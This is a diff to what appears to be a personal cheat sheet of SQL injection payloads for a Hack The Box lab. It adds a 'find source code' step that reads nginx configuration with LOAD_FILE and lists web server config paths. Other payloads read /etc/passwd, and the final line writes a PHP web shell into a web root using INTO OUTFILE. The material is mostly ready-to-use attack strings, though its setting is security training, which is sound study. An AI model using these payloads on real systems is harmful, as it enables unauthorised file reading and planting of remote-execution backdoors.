@@ -1,3 +1,6 @@
+Important:
+- Have to find the correct number of columns and have to find the vulnerable column(s) to display anything.
+
 ```
 mysql -u root -h docker.hackthebox.eu -P 3306 -p
 ```
@@ -49,6 +52,15 @@ cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schem
 cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
 ```
 
+**Find Source Code
+```
+cn') UNION SELECT 1, 2, LOAD_FILE("/etc/nginx/nginx.conf"), 4-- -
+```
+- Apache's configuration found at /etc/apache2/apache2.conf
+- Nginx's configuration at /etc/nginx/nginx.conf
+- /etc/nginx/sites-enabled/default
+- IIS configuration at %WinDir%\System32\Inetsrv\Config\ApplicationHost.config
+
 **File Read
 ```
 cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
@@ -60,5 +72,5 @@ CTRL+U
 ```
 cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
 cn' union select '','file written successfully!','','' into outfile '/tmp/proof2.txt'-- -
-cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
+cn' union select "", "",'<?php system($_REQUEST[0]); ?>', "" into outfile '/var/www/chattr-prod/shell.php'-- -
 ```
